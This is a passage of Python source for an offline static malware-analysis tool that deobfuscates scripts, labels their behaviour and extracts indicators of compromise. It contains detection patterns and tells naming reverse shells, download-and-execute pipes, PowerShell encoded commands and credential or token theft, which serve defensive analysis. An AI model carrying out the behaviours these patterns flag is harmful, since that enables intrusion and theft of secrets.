"""revauto -- automated RE analyst (junior-analyst style).

Two lanes: a *script lane* (layered pure-transform deobfuscation of Python / JavaScript /
shell / PowerShell, labelled parts, IOCs, tells, flag-checker solver) and a *binary lane*
(radare2 / ghidra when present, otherwise a stdlib-only ELF/PE digest).

Hard rules (see PLAN-revauto.md): the analysed payload is NEVER executed (no dynamic code
evaluation of payload data, no pickle loading, marshal only inside an isolated helper
process that never calls the code object); fully offline; every claim carries a confidence
label ([H] deterministic, [M] corroborated heuristic, [L] single weak heuristic); output
describes behaviour, never intent.
"""
from __future__ import annotations

import argparse
import ast
import base64
import binascii
import bz2
import collections
import contextlib
import dataclasses
import fnmatch
import hashlib
import importlib.util
import io
import json
import lzma
import os
import pickletools
import re
import shlex
import shutil
import string
import struct
import subprocess
import sys
import tempfile
import threading
import time
import urllib.parse
import zlib
from dataclasses import dataclass, field
from typing import Any, Callable

if __package__:  # imported via the registry (modules.revauto)
    from . import batch, binextras, decode, disasm, pwnhelp, triage
else:  # python3 modules/revauto.py
    import batch, binextras, decode, disasm, pwnhelp, triage  # type: ignore[no-redef]

NAME = "revauto"
DESCRIPTION = ("Automated RE analyst: unwrap obfuscated py/js/sh, label each part, IOCs + tells; "
               "ELF/PE digest (r2/ghidra/builtin)")

# ---------- constants
MAX_INPUT = 64 << 20
MAX_SCRIPT = 8 << 20
MAX_LAYER_OUT = 16 << 20
MAX_TOTAL_OUT = 64 << 20
DEFAULT_DEPTH = 8
HARD_DEPTH = 32
MAX_LAYERS = 24
FOLD_BUDGET = 200_000
MAX_ITER = 1_000_000
MAX_STR_MULT = 1 << 20
HELPER_TIMEOUT = 10
R2_TIMEOUT = 120
GHIDRA_TIMEOUT = 600
MAX_FINDINGS = 5000
IOC_SCAN_CAP = 1 << 20  # per-layer IOC regex window (keeps pathological layers fast)

FLAG_RE_B = batch.FLAG_RE
FLAG_RE = re.compile(batch.FLAG_RE.pattern.decode())
_WHICH: Callable[[str], str | None] = shutil.which

CATEGORIES = ["DYNAMIC_CODE", "EXEC", "NETWORK", "DOWNLOAD", "FILE_READ", "FILE_WRITE", "FILE_DELETE",
              "PERSISTENCE", "CREDENTIALS", "RECON", "PRIVESC", "ANTI_ANALYSIS", "DESTRUCTIVE", "CRYPTO",
              "ENCODING", "INPUT", "COMPARE_CHECK", "DYNAMIC_LOAD", "MEMORY_EXEC", "RNG", "OUTPUT"]
SEV_RANK = {"info": 0, "low": 1, "medium": 2, "high": 3}
CONF_LABEL = {"high": "H", "medium": "M", "low": "L", "forced": "H"}
TELL_SEV = {
    "T-DECODE-EXEC": "high", "T-DYN-EXEC": "high", "T-LAMBDA-WRAPPER": "medium", "T-MARSHAL": "high",
    "T-PICKLE-REDUCE": "high", "T-JS-PACKED": "medium", "T-JS-STRING-TABLE": "medium",
    "T-JS-STRING-TABLE-RC4": "medium", "T-JSFUCK": "high", "T-AAENCODE": "high", "T-JJENCODE": "high",
    "T-SHELL-PIPE-EXEC": "high", "T-DOWNLOAD-EXEC": "high", "T-REVSHELL": "high", "T-PERSIST": "high",
    "T-CRED-ACCESS": "high", "T-DESTRUCTIVE": "high", "T-MEMORY-EXEC": "high", "T-PRIVESC": "medium",
    "T-ANTI-DEBUG": "medium", "T-ANTI-FORENSICS": "medium", "T-HARDCODED-IP": "medium",
    "T-HARDCODED-SECRET": "medium", "T-RENAME-DENSITY": "medium", "T-CONCAT-SPLIT": "low",
    "T-CHARCODE-ARRAY": "low", "T-ESCAPE-DENSITY": "low", "T-GETATTR-STRING": "medium",
    "T-IMPORT-DYNAMIC": "medium", "T-LONG-LITERAL": "info", "T-CUSTOM-B64": "high", "T-CHECKER": "info",
    "T-SIZE-CAP": "info", "T-DEPTH-CAP": "info", "T-SLEEP": "low", "T-PACKED": "high", "T-UPX": "high",
    "T-PTRACE": "medium", "T-TIMING": "low", "T-VM-CHECK": "low", "T-PROC-SELF": "medium",
    "T-SELF-MODIFY": "medium", "T-EXEC-STACK": "medium", "T-STATIC-STRIPPED": "info", "T-DOTNET": "info",
    "T-PYINSTALLER": "info", "T-XOR-LOOP": "low", "T-EMBEDDED-FILE": "medium",
}


class TransformError(ValueError):
    """Raised by a pure transform on malformed input."""


# ---------- data model
@dataclass
class Layer:
    id: str
    parent: str | None
    depth: int
    lang: str
    kind: str
    via: str
    src_loc: str | None
    data: bytes
    text: str | None
    view: str | None = None
    sha256: str = ""
    confidence: str = "high"
    notes: list[str] = field(default_factory=list)
    meta: dict = field(default_factory=dict)


@dataclass
class Evidence:
    loc: str
    snippet: str
    rule: str


@dataclass
class Block:
    layer: str
    kind: str
    name: str
    start: int
    end: int
    categories: list[str]
    actions: list[str]
    calls: list[str]
    evidence: list[Evidence]
    summary: str
    confidence: str


@dataclass
class Tell:
    id: str
    severity: str
    loc: str
    title: str
    detail: str
    confidence: str


@dataclass
class IOC:
    type: str
    value: str
    loc: str
    context: str
    confidence: str
    tags: list[str] = field(default_factory=list)


@dataclass
class Checker:
    loc: str
    method: str
    candidate: str
    confidence: str
    detail: str


@dataclass
class EngineStatus:
    name: str
    status: str
    backend: str = ""
    path: str = ""
    reason: str = ""
    seconds: float = 0.0


@dataclass
class Report:
    target: dict
    lane: str = "script"
    lang: str = "text"
    lang_confidence: str = "low"
    layers: list[Layer] = field(default_factory=list)
    blocks: list[Block] = field(default_factory=list)
    tells: list[Tell] = field(default_factory=list)
    iocs: list[IOC] = field(default_factory=list)
    checkers: list[Checker] = field(default_factory=list)
    binary: dict | None = None
    engines: dict = field(default_factory=dict)
    scores: dict = field(default_factory=dict)
    notes: list[str] = field(default_factory=list)
    errors: list[str] = field(default_factory=list)
    flows: dict = field(default_factory=dict)
    flags: list[str] = field(default_factory=list)
    next_steps: list[str] = field(default_factory=list)
    metrics: dict = field(default_factory=dict)


@dataclass
class Options:
    deep: bool = False
    as_json: bool = False
    max_depth: int = DEFAULT_DEPTH
    lane: str = "auto"
    lang: str = "auto"
    engine: str = "auto"
    timeout: int | None = None
    flag_re: re.Pattern | None = None
    rename: bool = False
    dump_dir: str | None = None


@dataclass
class Engines:
    r2_path: str | None = None
    r2pipe: Any | None = None
    ghidra_path: str | None = None
    capstone: bool = False
    r2_backend_factory: Callable | None = None
    ghidra_runner: Callable | None = None


def _stage(report: Report, name: str, fn: Callable, *a: Any) -> Any:
    """Run one analyser stage; record (never raise) any Exception, RecursionError and MemoryError."""
    try:
        return fn(*a)
    except Exception as exc:  # noqa: BLE001 - a broken detector degrades the report only
        report.errors.append(f"{name}: {type(exc).__name__}: {str(exc)[:160]}")
        return None


def _add_tell(report: Report, tid: str, loc: str, title: str, detail: str = "", conf: str = "high",
              sev: str | None = None) -> None:
    sev = sev or TELL_SEV.get(tid, "info")
    for t in report.tells:
        if t.id == tid and t.loc == loc:
            return
    if len(report.tells) < MAX_FINDINGS:
        report.tells.append(Tell(tid, sev, loc, title[:120], detail[:200], conf))


def _line_of(text: str, pos: int) -> int:
    return text.count("\n", 0, pos) + 1


def _snip(s: str, n: int = 120) -> str:
    s = " ".join(str(s).split())
    return s if len(s) <= n else s[:n - 1] + "…"


# ---------- shared helpers: IOCs
_URL_RE = re.compile(r"\b(?:https?|ftps?|wss?|tcp|udp|file)://[^\s'\"<>`)\]\\]{3,}")
_IP_RE = re.compile(r"(?<![\d.])(\d{1,3}(?:\.\d{1,3}){3})(?::(\d{1,5}))?(?![\d.])")
_IPTUP_RE = re.compile(r"""['"](\d{1,3}(?:\.\d{1,3}){3})['"]\s*,\s*(\d{1,5})\b""")
_DOMAIN_RE = re.compile(r"(?<![\w.@/-])((?:[a-z0-9-]+\.)+(?:com|net|org|io|ru|cn|xyz|top|info|biz|cc|tk|onion|me|co|dev|app|site|online|club))\b", re.I)
_EMAIL_RE = re.compile(r"[\w.+-]+@[\w-]+\.[\w.-]+")
_PATH_RE = re.compile(r"(?<![\w/:.~])(?:~|/(?:etc|tmp|var|home|root|usr|bin|sbin|dev|proc|opt|lib|lib64|sys|run|mnt|srv|boot))(?:/[\w.\-+@%]+)+/?")
_WINPATH_RE = re.compile(r"[A-Za-z]:\\\\?(?:[^\\/:*?\"<>|\r\n\s]+\\\\?)*[^\\/:*?\"<>|\r\n\s]*|%(?:APPDATA|TEMP|USERPROFILE|PROGRAMDATA)%\\[^\s'\"]*")
_REG_RE = re.compile(r"(?:HKEY_[A-Z_]+|HKLM|HKCU|HKCR|HKU)\\\\?[^\s'\"]+")
_PEM_RE = re.compile(r"-----BEGIN [A-Z ]*(?:PRIVATE KEY|RSA|OPENSSH|PGP)[A-Z ]*-----")
_AWS_RE = re.compile(r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b")
_JWT_RE = re.compile(r"\beyJ[\w-]{8,}\.eyJ[\w-]{8,}\.[\w-]{8,}\b")
_TG_RE = re.compile(r"\b\d{8,10}:[A-Za-z0-9_-]{35}\b")
_HEXSEC_RE = re.compile(r"(?<![0-9A-Fa-f])(?:[0-9a-fA-F]{32}|[0-9a-fA-F]{40}|[0-9a-fA-F]{64}|[0-9a-fA-F]{128})(?![0-9A-Fa-f])")
_SECRET_RE = re.compile(r"""(?i)\b\w*(key|secret|passw(?:or)?d|pwd|token|iv|salt|api_?key)\w*\s*[:=]\s*['"]([^'"\n]{4,})['"]""")
_B64BLOB_RE = re.compile(r"['\"]([A-Za-z0-9+/]{40,}={0,2})['\"]")


def _ip_tags(ip: str) -> list[str] | None:
    o = [int(x) for x in ip.split(".")]
    if any(x > 255 for x in o):
        return None
    t: list[str] = []
    if o[0] == 10 or (o[0] == 172 and 16 <= o[1] <= 31) or (o[0] == 192 and o[1] == 168):
        t.append("private")
    if o[0] == 127:
        t.append("loopback")
    if o[0] == 169 and o[1] == 254:
        t.append("link-local")
    if 224 <= o[0] <= 239:
        t.append("multicast")
    if o[:3] in ([192, 0, 2], [198, 51, 100], [203, 0, 113]):
        t.append("doc")
    return t


def extract_iocs(text: str, loc_prefix: str, flag_re: re.Pattern, tags: tuple[str, ...] = ()) -> list[IOC]:
    """Extract IOCs (URLs, IPs, paths, flags, keys...) from ``text``; ``loc_prefix`` is e.g. ``"L3"``."""
    out: list[IOC] = []
    seen: dict[tuple[str, str], IOC] = {}
    counts: collections.Counter = collections.Counter()
    text = text[:IOC_SCAN_CAP]

    def add(t: str, v: str, ln: int, ctx: str, conf: str, extra: list[str] | None = None) -> None:
        key = (t, v)
        if key in seen:
            counts[key] += 1
            return
        if len(out) >= MAX_FINDINGS:
            return
        ioc = IOC(t, v, f"{loc_prefix}:{ln}", _snip(ctx, 100), conf, list(tags) + (extra or []))
        seen[key] = ioc
        out.append(ioc)

    for ln, line in enumerate(text.split("\n"), 1):
        if len(line) > 20000:
            line = line[:20000]
        stripped = line.lstrip()
        comment = stripped.startswith(("#", "//"))
        conf_c = "medium" if comment else "high"
        for m in _URL_RE.finditer(line):
            u = m.group().rstrip(".,;")
            add("url", u, ln, line, "high")
            host = urllib.parse.urlsplit(u).hostname
            if host and not _IP_RE.fullmatch(host):
                add("domain", host, ln, line, "high")
        for m in _IPTUP_RE.finditer(line):
            tg = _ip_tags(m.group(1))
            if tg is not None and int(m.group(2)) <= 65535:
                add("ip_port", f"{m.group(1)}:{m.group(2)}", ln, line, "high", tg)
        for m in _IP_RE.finditer(line):
            tg = _ip_tags(m.group(1))
            if tg is None:
                continue
            pre = line[max(0, m.start() - 8):m.start()].lower()
            if re.search(r"v\s*$|version", pre):
                continue
            if m.group(1) == "0.0.0.0":
                if not re.search(r"bind|connect|listen", line):
                    continue
                tg = tg + ["any"]
            if m.group(2) and int(m.group(2)) <= 65535:
                add("ip_port", f"{m.group(1)}:{m.group(2)}", ln, line, conf_c, tg)
            add("ip", m.group(1), ln, line, conf_c, tg)
        for m in _EMAIL_RE.finditer(line):
            add("email", m.group(), ln, line, "medium")
        for m in _DOMAIN_RE.finditer(line):
            if "://" not in line[max(0, m.start() - 8):m.start()] and not re.match(r"\s*(import|from)\b", line):
                add("domain", m.group(1).lower(), ln, line, "low")
        for m in _PATH_RE.finditer(line):
            add("path", m.group().rstrip("/") if len(m.group()) > 1 else m.group(), ln, line, "medium")
        for m in _WINPATH_RE.finditer(line):
            if len(m.group()) > 5:
                add("winpath", m.group(), ln, line, "medium")
        for m in _REG_RE.finditer(line):
            add("registry", m.group(), ln, line, "high")
        for fre in {flag_re, FLAG_RE}:
            for m in fre.finditer(line):
                add("flag", m.group(), ln, line, "high")
        if _PEM_RE.search(line):
            add("key_pem", _PEM_RE.search(line).group(), ln, line, "high")
        for m in _AWS_RE.finditer(line):
            add("aws_key", m.group(), ln, line, "high")
        for m in _JWT_RE.finditer(line):
            add("jwt", m.group()[:60], ln, line, "high")
        for m in _TG_RE.finditer(line):
            add("tg_token", m.group(), ln, line, "medium")
        for m in _HEXSEC_RE.finditer(line):
            add("hex_secret", m.group(), ln, line, "low", ["hash-or-key?"])
        for m in _SECRET_RE.finditer(line):
            add("secret_assign", f"{m.group(0).split('=')[0].split(':')[0].strip()}={m.group(2)[:40]}", ln, line, "medium")
    for key, n in counts.items():
        seen[key].context += f" (+{n} more)"
    return out


def _merge_iocs(report: Report, new: list[IOC]) -> None:
    have = {(i.type, i.value): i for i in report.iocs}
    for i in new:
        k = (i.type, i.value)
        if k in have:
            have[k].context = have[k].context if "more" in have[k].context else have[k].context
            continue
        if len(report.iocs) < MAX_FINDINGS:
            report.iocs.append(i)
            have[k] = i


def _note_flags(report: Report, flag_re: re.Pattern) -> None:
    flags: list[str] = []
    for i in report.iocs:
        if i.type == "flag" and i.value not in flags:
            flags.append(i.value)
    for c in report.checkers:
        if c.candidate and (flag_re.search(c.candidate) or FLAG_RE.search(c.candidate)) and c.candidate not in flags:
            flags.append(c.candidate)
    report.flags = flags


# ---------- shared helpers: crypto constants
def _u32(*v: int) -> bytes:
    return b"".join(struct.pack("<I", x) for x in v)


def _u64(*v: int) -> bytes:
    return b"".join(struct.pack("<Q", x) for x in v)


# name, table patterns (bytes), imm values (u32/u64 LE packed singles), imm width, distinctive, conf
CRYPTO_CONSTS: list[dict] = [
    {"name": "AES S-box", "table": bytes.fromhex("637c777bf26b6fc53001672bfed7ab76"), "conf": "high"},
    {"name": "AES inverse S-box", "table": bytes.fromhex("52096ad53036a538bf40a39e81f3d7fb"), "conf": "high"},
    {"name": "AES T-table (Te0)", "table": bytes.fromhex("a56363c6847c7cf8"), "conf": "high"},
    {"name": "AES Rcon", "table": bytes.fromhex("01020408102040801b36"), "conf": "medium"},
    {"name": "SHA-256 IV", "table": _u32(0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a), "imm": [0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a], "w": 4, "conf": "high"},
    {"name": "SHA-256 K", "table": _u32(0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5), "imm": [0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5], "w": 4, "conf": "high"},
    {"name": "SHA-512 IV", "table": _u64(0x6a09e667f3bcc908, 0xbb67ae8584caa73b), "imm": [0x6a09e667f3bcc908, 0xbb67ae8584caa73b], "w": 8, "conf": "high"},
    {"name": "MD5 / SHA-1 init", "table": _u32(0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476), "imm": [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476], "w": 4, "conf": "high"},
    {"name": "MD5 T table", "table": _u32(0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee), "imm": [0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee], "w": 4, "conf": "high"},
    {"name": "CRC32 table", "table": _u32(0x00000000, 0x77073096, 0xee0e612c, 0x990951ba), "conf": "high"},
    {"name": "CRC32 poly", "imm": [0xedb88320], "w": 4, "distinctive": True, "conf": "low"},
    {"name": "TEA/XTEA delta", "imm": [0x9e3779b9, 0x61c88647], "w": 4, "distinctive": True, "conf": "medium"},
    {"name": "ChaCha/Salsa", "table": b"expand 32-byte k", "conf": "high"},
    {"name": "ChaCha/Salsa (16)", "table": b"expand 16-byte k", "conf": "high"},
    {"name": "Blowfish P-array", "table": _u32(0x243f6a88, 0x85a308d3, 0x13198a2e, 0x03707344), "imm": [0x243f6a88, 0x85a308d3, 0x13198a2e, 0x03707344], "w": 4, "conf": "high"},
    {"name": "DES IP table", "table": bytes.fromhex("3a322a221a120a02"), "conf": "medium"},
    {"name": "RC4/identity table", "table": bytes(range(256)), "conf": "medium", "note": "RC4 KSA init or lookup table"},
    {"name": "FNV-1 32", "imm": [0x811c9dc5, 0x01000193], "w": 4, "conf": "low"},
    {"name": "Base64 alphabet", "table": b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", "conf": "medium"},
]
_B64STD = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
_B64URL = _B64STD[:62] + "-_"
_B64RUN_RE = re.compile(rb"[A-Za-z0-9+/_=-]{64}")
_CONF_DOWN = {"high": "medium", "medium": "low", "low": "low"}


def scan_crypto_constants(data: bytes, base_vaddr: int | None = None) -> list[dict]:
    """Find well-known crypto tables / immediates in ``data``; hits are ``{name, offset, confidence, tag}``."""
    hits: list[dict] = []

    def add(name: str, off: int, conf: str, tag: str = "", note: str = "") -> None:
        if len(hits) < MAX_FINDINGS:
            h = {"name": name, "offset": off, "confidence": conf, "tag": tag}
            if note:
                h["note"] = note
            if base_vaddr is not None:
                h["vaddr"] = base_vaddr + off
            hits.append(h)

    def find_all(pat: bytes, cap: int = 8) -> list[int]:
        res, s = [], 0
        while len(res) < cap:
            i = data.find(pat, s)
            if i < 0:
                break
            res.append(i)
            s = i + 1
        return res

    for e in CRYPTO_CONSTS:
        found_table = False
        tab = e.get("table")
        if tab:
            for off in find_all(tab):
                add(e["name"], off, e["conf"], "", e.get("note", ""))
                found_table = True
            if len(tab) % 4 == 0 and len(tab) >= 8 and e.get("imm") and e.get("w") == 4:
                be = b"".join(tab[i:i + 4][::-1] for i in range(0, len(tab), 4))
                for off in find_all(be):
                    add(e["name"], off, _CONF_DOWN[e["conf"]], "BE")
                    found_table = True
        imm = e.get("imm")
        if imm and not found_table:
            w = e["w"]
            pos: list[tuple[int, int]] = []
            for v in imm:
                for off in find_all(v.to_bytes(w, "little"), 16):
                    pos.append((off, v))
            if e.get("distinctive") and pos:
                add(e["name"], pos[0][0], e["conf"], "imm")
            else:
                pos.sort()
                for i, (off, v) in enumerate(pos):
                    if any(o2 != off and v2 != v and abs(o2 - off) <= 256 for o2, v2 in pos):
                        add(e["name"], off, "medium", "imm")
                        break
    for m in _B64RUN_RE.finditer(data):
        run = m.group().decode()
        if len(set(run)) == 64 and run not in (_B64STD, _B64URL) and (set(run) == set(_B64STD) or set(run) == set(_B64URL)):
            add("Custom base64 alphabet", m.start(), "high", "T-CUSTOM-B64")
    return hits


# ---------- pure transforms
_TRUNC = [False]


def _cap(b: bytes) -> bytes:
    if len(b) > MAX_LAYER_OUT:
        _TRUNC[0] = True
        return b[:MAX_LAYER_OUT]
    return b


def _decomp_zlib(data: bytes, wbits: int) -> bytes:
    d = zlib.decompressobj(wbits)
    try:
        out = d.decompress(data, MAX_LAYER_OUT)
    except zlib.error as exc:
        raise TransformError(str(exc)) from exc
    if len(out) >= MAX_LAYER_OUT and d.unconsumed_tail:
        _TRUNC[0] = True
    if not out and not data:
        raise TransformError("empty")
    return out


def _decomp_bz2(data: bytes) -> bytes:
    d = bz2.BZ2Decompressor()
    try:
        out = d.decompress(data, MAX_LAYER_OUT)
    except (OSError, ValueError) as exc:
        raise TransformError(str(exc)) from exc
    if len(out) >= MAX_LAYER_OUT and not d.eof:
        _TRUNC[0] = True
    return out


def _decomp_lzma(data: bytes) -> bytes:
    d = lzma.LZMADecompressor()
    try:
        out = d.decompress(data, max_length=MAX_LAYER_OUT)
    except (lzma.LZMAError, ValueError) as exc:
        raise TransformError(str(exc)) from exc
    if len(out) >= MAX_LAYER_OUT and not d.eof:
        _TRUNC[0] = True
    return out


def _tb(x: str | bytes) -> bytes:
    return x.encode("latin-1", "replace") if isinstance(x, str) else bytes(x)


def _need(v: bytes | None) -> bytes:
    if v is None:
        raise TransformError("bad input")
    return v


def _t_b64(x: str | bytes) -> bytes:
    s = _tb(x).decode("latin-1")
    return _need(decode.b64_decode(s))


def _t_b85(x: str | bytes) -> bytes:
    try:
        return base64.b85decode(_tb(x).strip())
    except (ValueError, binascii.Error) as exc:
        raise TransformError(str(exc)) from exc


def _t_a85(x: str | bytes) -> bytes:
    try:
        return base64.a85decode(_tb(x).strip())
    except (ValueError, binascii.Error) as exc:
        raise TransformError(str(exc)) from exc


def _t_rot13(x: str | bytes) -> str | bytes:
    if isinstance(x, bytes):
        return x.decode("latin-1").translate(_ROT13).encode("latin-1")
    return x.translate(_ROT13)


_ROT13 = str.maketrans("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
                       "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm")


def _t_jsunescape(x: str | bytes) -> bytes:
    s = _tb(x).decode("latin-1")
    s = re.sub(r"%u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), s)
    return urllib.parse.unquote_to_bytes(s) if "%u" not in s and not any(ord(c) > 255 for c in s) else s.encode("utf-8")


TRANSFORMS: dict[str, Callable] = {
    "b64": _t_b64,
    "b32": lambda x: _need(decode.b32_decode(_tb(x).decode("latin-1"))),
    "hex": lambda x: _need(decode.hex_decode(_tb(x).decode("latin-1"))),
    "b16": lambda x: _need(decode.hex_decode(_tb(x).decode("latin-1"))),
    "b85": _t_b85,
    "a85": _t_a85,
    "zlib": lambda x: _decomp_zlib(_tb(x), 15),
    "gzip": lambda x: _decomp_zlib(_tb(x), 31),
    "raw-deflate": lambda x: _decomp_zlib(_tb(x), -15),
    "zlib-auto": lambda x: _decomp_zlib(_tb(x), 47),
    "bz2": lambda x: _decomp_bz2(_tb(x)),
    "lzma": lambda x: _decomp_lzma(_tb(x)),
    "xz": lambda x: _decomp_lzma(_tb(x)),
    "rot13": _t_rot13,
    "reverse": lambda x: x[::-1],
    "utf8": lambda x: _tb(x).decode("utf-8", "replace"),
    "latin1": lambda x: _tb(x).decode("latin-1"),
    "utf16le": lambda x: _tb(x).decode("utf-16le", "replace"),
    "url": lambda x: urllib.parse.unquote_to_bytes(_tb(x).decode("latin-1")),
    "js-unescape": _t_jsunescape,
    "charcodes": lambda x: "".join(chr(int(c)) for c in x),
    "fromhex": lambda x: _need(decode.hex_decode(_tb(x).decode("latin-1"))),
}


def transform(name: str, data: str | bytes) -> str | bytes:
    """Apply a named pure transform (bounded by MAX_LAYER_OUT)."""
    fn = TRANSFORMS.get(name)
    if fn is None:
        raise TransformError(f"unknown transform {name}")
    try:
        out = fn(data)
    except TransformError:
        raise
    except Exception as exc:  # noqa: BLE001
        raise TransformError(f"{name}: {exc}") from exc
    return _cap(out) if isinstance(out, bytes) else out


# ---------- language detection
@dataclass
class Unwrap:
    data: bytes
    lang: str | None
    kind: str
    via: str
    src_loc: str
    confidence: str = "high"
    notes: list = field(default_factory=list)


def _decode_text(data: bytes) -> str:
    if data[:3] == b"\xef\xbb\xbf":
        data = data[3:]
    if data[:2] in (b"\xff\xfe", b"\xfe\xff"):
        return data.decode("utf-16", "replace")
    if len(data) > 3 and data[1:2] == b"\x00" and data[3:4] == b"\x00" and b"\x00" not in data[0:1] + data[2:3]:
        return data.decode("utf-16le", "replace")
    return data.decode("utf-8", "replace")


def _detect_lang(text: str) -> tuple[str, str]:
    """Score py/js/sh/ps1 for ``text``; returns (lang, confidence)."""
    sc = {"py": 0, "js": 0, "sh": 0, "ps1": 0}
    head = text[:200000]
    first = head.split("\n", 1)[0]
    if first.startswith("#!"):
        if "python" in first:
            sc["py"] += 10
        elif "node" in first:
            sc["js"] += 10
        elif re.search(r"\b(sh|bash|zsh|dash)\b", first):
            sc["sh"] += 10
        elif re.search(r"pwsh|powershell", first):
            sc["ps1"] += 10
    try:
        ast.parse(head)
        if "\n" in head.strip() or re.search(r"import|exec\(|def ", head):
            sc["py"] += 6
    except (SyntaxError, ValueError, RecursionError, MemoryError):
        pass
    n = 0
    for m in re.finditer(r"^\s*(?:import \w|from [\w.]+ import )", head, re.M):
        sc["py"] += 2
        n += 1
        if n >= 3:
            break
    for pat in (r"^\s*def \w+\(.*\):", r"^\s*class \w+.*:", r"__name__", r"\bprint\("):
        if re.search(pat, head, re.M):
            sc["py"] += 2
    for pat in (r"\b(?:var|let|const)\s+\w+\s*=", r"function\s*\w*\s*\(", r"=>", r"document\.", r"window\.",
                r"require\(", r"console\.log", r"==="):
        if re.search(pat, head):
            sc["js"] += 2
    if "eval(function(p,a,c,k,e," in head:
        sc["js"] += 10
    for pat in (r"^\s*(?:if \[|fi$|then$|do$|done$|esac$)", r"\$\(", r"\$\{\w+", r"\|\s*(?:ba)?sh\b",
                r"^\s*(?:echo|export|chmod|curl|wget|eval|printf)\s", r"\$'[^']*\\x"):
        if re.search(pat, head, re.M):
            sc["sh"] += 2
    for pat in (r"\$\w+\s*=", r"Invoke-Expression|IEX\b", r"-EncodedCommand|-enc\b", r"\[System\.Convert\]::",
                r"New-Object\s"):
        if re.search(pat, head):
            sc["ps1"] += 3
    order = ["py", "js", "sh", "ps1"]
    best = max(order, key=lambda k: (sc[k], -order.index(k)))
    if sc[best] == 0:
        return "text", "low"
    rest = sorted((v for k, v in sc.items() if k != best), reverse=True)
    margin = sc[best] - rest[0]
    conf = "high" if sc[best] >= 6 and margin >= 3 else ("medium" if sc[best] >= 3 else "low")
    return best, conf


def _pyc_magic_ok(data: bytes) -> bool:
    return len(data) >= 16 and data[2:4] == b"\r\n" and 3000 <= int.from_bytes(data[:2], "little") <= 4000


def _pyc_version(n: int) -> str:
    for lo, hi, v in ((3379, 3379, "3.6"), (3390, 3394, "3.7"), (3400, 3413, "3.8"), (3420, 3425, "3.9"),
                      (3430, 3439, "3.10"), (3450, 3495, "3.11"), (3500, 3531, "3.12"), (3550, 3571, "3.13")):
        if lo <= n <= hi:
            return v
    return "3.14+" if n >= 3600 else "unknown"


def _is_zlib_hdr(d: bytes) -> bool:
    return len(d) > 2 and d[0] == 0x78 and d[1] in (0x01, 0x5E, 0x9C, 0xDA) and (d[0] * 256 + d[1]) % 31 == 0


def _is_pickle(d: bytes) -> bool:
    if len(d) >= 2 and d[0] == 0x80 and 2 <= d[1] <= 5:
        return True
    return bool(d.endswith(b".") and d[:1] in (b"c", b"(") and b"\n" in d[:64] and d[:1] != b"" and re.match(rb"[c(][\w.\n(S'\"]", d))


def detect_input(data: bytes, name: str = "") -> tuple[str, str, str]:
    """Route input to a lane: returns ``(lane, lang, confidence)``."""
    if data[:4] == b"\x7fELF":
        return "bin", "elf", "high"
    if data[:2] == b"MZ":
        try:
            triage.parse_pe(data)
            return "bin", "pe", "high"
        except (ValueError, struct.error):
            return "blob", "data", "medium"
    if _pyc_magic_ok(data):
        return "script", "pyc", "high"
    if (data[:2] == b"\x1f\x8b" or _is_zlib_hdr(data) or data[:3] == b"BZh"
            or data[:6] == b"\xfd7zXZ\x00" or _is_pickle(data)):
        return "script", "blob", "high"
    sample = data[:65536]
    if sample[:2] in (b"\xff\xfe", b"\xfe\xff") or (len(sample) > 3 and sample[1:2] == b"\x00" and sample[3:4] == b"\x00"):
        return "script", _detect_lang(_decode_text(data[:MAX_SCRIPT]))[0], "medium"
    body = sample[3:] if sample[:3] == b"\xef\xbb\xbf" else sample
    try:
        body.decode("utf-8")
        ok = True
    except UnicodeDecodeError as exc:
        ok = exc.start >= len(body) - 4 or len(body.decode("utf-8", "ignore")) >= 0.95 * len(body)
    if sample and ok and decode.printable_ratio(body) >= 0.85:
        lang, conf = _detect_lang(_decode_text(data[:MAX_SCRIPT]))
        return "script", lang, conf
    return "blob", "data", "low"


# ---------- Python static folder (pure; never calls anything outside a whitelist)
class _Unk:
    def __repr__(self) -> str:
        return "UNKNOWN"


UNKNOWN: Any = _Unk()


class TStr(str):
    """str carrying the chain of transforms that produced it."""
    chain: tuple = ()


class TBytes(bytes):
    """bytes carrying the chain of transforms that produced it."""
    chain: tuple = ()


def _chain(v: Any) -> tuple:
    return getattr(v, "chain", ())


def _wrap(v: Any, chain: tuple) -> Any:
    if isinstance(v, str):
        o: Any = TStr(v)
    elif isinstance(v, bytes):
        o = TBytes(v)
    else:
        return v
    o.chain = tuple(chain)
    return o


@dataclass
class ModuleRef:
    name: str


@dataclass
class ModVars:
    name: str


@dataclass
class FuncRef:
    name: str
    bound: Any = None


@dataclass
class LambdaVal:
    node: ast.Lambda
    env: dict


@dataclass
class MarshalBlob:
    data: bytes
    chain: tuple = ()


@dataclass
class PickleBlob:
    data: bytes
    chain: tuple = ()


_BUILTIN_NAMES = {"chr", "ord", "bytes", "bytearray", "str", "int", "list", "tuple", "map", "reversed", "len",
                  "range", "zip", "sum", "hex", "__import__", "exec", "eval", "compile", "getattr", "vars",
                  "input", "open", "print", "bool"}
_B64_FUNCS = {"base64.b64decode": "b64", "base64.standard_b64decode": "b64", "base64.urlsafe_b64decode": "b64",
              "base64.decodebytes": "b64", "base64.b32decode": "b32", "base64.b16decode": "b16",
              "base64.b85decode": "b85", "base64.a85decode": "a85", "binascii.unhexlify": "hex",
              "binascii.a2b_hex": "hex", "binascii.a2b_base64": "b64", "zlib.decompress": "zlib",
              "gzip.decompress": "gzip", "bz2.decompress": "bz2", "lzma.decompress": "lzma",
              "bytes.fromhex": "hex"}
_ENC_FUNCS = {"base64.b64encode": base64.b64encode, "base64.encodebytes": base64.encodebytes,
              "binascii.hexlify": binascii.hexlify}
